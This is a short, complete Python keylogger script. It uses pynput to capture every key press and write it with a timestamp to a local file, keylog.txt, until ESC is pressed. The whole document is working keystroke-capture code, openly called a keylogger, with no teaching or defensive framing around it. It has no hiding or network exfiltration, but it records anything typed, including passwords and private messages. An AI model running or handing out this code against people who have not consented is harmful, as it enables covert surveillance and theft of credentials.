from pynput import keyboard
import logging

# Set up logging to file
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

print("Keylogger started. Press ESC to stop.")

def on_press(key):
    try:
        logging.info(str(key))
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        print("\nKeylogger stopped.")
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
